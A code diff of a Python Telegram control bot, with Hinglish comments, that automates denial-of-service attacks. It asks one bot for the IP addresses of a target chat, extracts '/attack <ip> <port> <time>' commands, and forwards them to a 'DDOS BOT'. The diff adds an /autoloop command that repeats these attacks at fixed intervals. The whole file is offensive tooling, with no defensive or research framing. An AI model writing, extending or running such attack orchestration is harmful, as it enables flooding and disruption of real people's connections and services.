@@ -40,22 +40,21 @@ async def ip_bot_listener(event):
     text = event.text or ""
     print("📩 IP BOT REPLY:", repr(text))
 
-    # 1) 'CMD:' wali line nikaalo
-    # Example: "CMD: /attack 91.108.17.54 32003 30"
+    # 'CMD:' wali line nikaalo
     m_line = re.search(r"CMD:s*(.+)", text)
     if not m_line:
         return
 
     line = m_line.group(1).strip()
 
-    # 2) Backticks ke andar ka part, agar ho to
+    # Backticks ke andar ka part, agar ho to
     m_cmd = re.search(r"`([^`]+)`", line)
     if m_cmd:
         raw_cmd = m_cmd.group(1).strip()
     else:
         raw_cmd = line.lstrip("* ").strip()
 
-    # 3) Sirf /attack <ip> <port> <time> command nikaalo
+    # Sirf /attack <ip> <port> <time> command nikaalo
     m_attack = re.search(r"(/attacks+S+s+S+s+S+)", raw_cmd)
     if m_attack:
         final_cmd = m_attack.group(1).strip()
@@ -80,7 +79,7 @@ async def bot_b_listener(event):
     low = text.lower()
     print("DDOS BOT MSG:", repr(text))
 
-    # READY patterns (unicode + plain text)
+    # READY patterns
     if (
         "✅ **ʀᴇᴀᴅʏ**" in text
         or "no attack running" in low
@@ -92,6 +91,8 @@ async def bot_b_listener(event):
     elif (
         "attack started" in low
         or "ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ" in text
+        or "starting attack" in low
+        or "sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ" in text
         or "attack running" in low
         or "ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
     ):
@@ -102,92 +103,93 @@ async def bot_b_listener(event):
         bot_b_status = "COOLDOWN"
 
     else:
-        bot_b_status = "UNKNOWN"
+        # ignore
+        pass
 
 
-# ---------- CORE LOOP ----------
-async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
-    global bot_b_status
+# ---------- SINGLE ROUND (1 attack) ----------
+async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Ek round:
+    - IP BOT se CMD lo
+    - DDOS BOT ko attack command bhejo
+    """
 
     target = chat_targets.get(chat_id)
     if not target:
-        await context.bot.send_message(chat_id, "❌ Target not set, use /setlinkchatid first.")
+        await context.bot.send_message(
+            chat_id,
+            "❌ Target not set, use /setlinkchatid first."
+        )
         return
-
-    count = chat_counts.get(chat_id, 1)
 
     await context.bot.send_message(
         chat_id,
-        f'''🔁 Loop configured.
-Target: `{target}`
-Rounds: {count}''',
+        f"➡️ Getting IP & CMD for `{target}`…",
         parse_mode="Markdown",
     )
 
+    loop = asyncio.get_running_loop()
+    fut = loop.create_future()
+    ip_waiters[chat_id] = fut
+
+    await tele.send_message(BOT_A, f".getip all {target}")
+
+    try:
+        final_cmd = await asyncio.wait_for(fut, timeout=60)
+    except asyncio.TimeoutError:
+        await context.bot.send_message(
+            chat_id,
+            "⏱️ Timeout: No CMD from IP BOT, skipping this attack…"
+        )
+        ip_waiters.pop(chat_id, None)
+        return
+
+    await context.bot.send_message(
+        chat_id,
+        f"📥 CMD from IP BOT:
+`{final_cmd}`",
+        parse_mode="Markdown",
+    )
+
+    # Direct attack bhej do (DDOS bot ka cooldown tum delay se handle karoge)
+    await tele.send_message(BOT_B, final_cmd)
+    await context.bot.send_message(
+        chat_id,
+        f"🚀 Sent to DDOS BOT:
+`{final_cmd}`",
+        parse_mode="Markdown",
+    )
+
+
+# ---------- AUTO LOOP ----------
+async def autoloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /autoloop
+    -> setcount ke hisaab se multiple single_round run karega
+    -> har attack ke beech fixed delay
+    """
+    chat_id = update.effective_chat.id
+    count = chat_counts.get(chat_id, 1)
+    delay = 45  # seconds: 30s attack + 10–15s cooldown buffer
+
+    await update.message.reply_text(
+        f"🔁 Auto loop starting.
+Attacks: {count}
+Delay: {delay}s between each."
+    )
+
     for i in range(count):
-        await context.bot.send_message(
-            chat_id,
-            f'''➡️ Round {i + 1}/{count}:
-Sending `.getip all {target}` to IP BOT…''',
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text(f"▶️ Attack {i + 1}/{count} starting…")
+        await single_round(chat_id, context)
 
-        loop = asyncio.get_running_loop()
-        fut = loop.create_future()
-        ip_waiters[chat_id] = fut
-
-        await tele.send_message(BOT_A, f".getip all {target}")
-
-        try:
-            final_cmd = await asyncio.wait_for(fut, timeout=60)
-        except asyncio.TimeoutError:
-            await context.bot.send_message(
-                chat_id,
-                "⏱️ Timeout: No CMD from IP BOT, skipping this round…"
+        if i != count - 1:
+            await update.message.reply_text(
+                f"⏳ Waiting {delay}s before next attack…"
             )
-            ip_waiters.pop(chat_id, None)
-            continue
+            await asyncio.sleep(delay)
 
-        await context.bot.send_message(
-            chat_id,
-            f'''📥 IP BOT CMD received:
-`{final_cmd}`''',
-            parse_mode="Markdown",
-        )
-
-        await context.bot.send_message(
-            chat_id,
-            "🔎 Checking BOT_B `/status` until READY…"
-        )
-
-        # Har round se pehle status reset
-        bot_b_status = "UNKNOWN"
-
-        while True:
-            await tele.send_message(BOT_B, "/status")
-            await asyncio.sleep(2)
-            print("DEBUG status:", bot_b_status)  # debug line
-
-            if bot_b_status == "READY":
-                break
-
-            await context.bot.send_message(
-                chat_id,
-                f"⏸ BOT_B status: {bot_b_status} (waiting 5s…)"
-            )
-            await asyncio.sleep(5)
-
-        await tele.send_message(BOT_B, final_cmd)
-        await context.bot.send_message(
-            chat_id,
-            f'''🚀 Sent to BOT_B:
-`{final_cmd}`''',
-            parse_mode="Markdown",
-        )
-        await asyncio.sleep(3)
-
-    await context.bot.send_message(chat_id, "✅ All rounds finished.")
-    loop_tasks.pop(chat_id, None)
+    await update.message.reply_text("✅ Auto loop finished.")
 
 
 # ---------- PTB COMMANDS ----------
@@ -209,23 +211,14 @@ async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    cid = update.effective_chat.id
-    if cid in loop_tasks:
-        await update.message.reply_text("⚠️ Loop already running")
-        return
-    task = asyncio.create_task(telethon_loop(cid, context))
-    loop_tasks[cid] = task
-    await update.message.reply_text("🔁 Loop started")
+    """
+    Optional: sirf ek single_round run kare.
+    """
+    await single_round(update.effective_chat.id, context)
 
 
 async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    cid = update.effective_chat.id
-    task = loop_tasks.pop(cid, None)
-    if task:
-        task.cancel()
-        await update.message.reply_text("🛑 Loop stopped")
-    else:
-        await update.message.reply_text("No active loop running")
+    await update.message.reply_text("❌ No internal loop to stop in /autoloop mode.")
 
 
 # ---------- MAIN ----------
@@ -237,6 +230,7 @@ async def main():
     app.add_handler(CommandHandler("setlinkchatid", setlink))
     app.add_handler(CommandHandler("setcount", setcount))
     app.add_handler(CommandHandler("startloop", startloop))
+    app.add_handler(CommandHandler("autoloop", autoloop))
     app.add_handler(CommandHandler("stoploop", stoploop))
 
     print("🤖 Control bot running")
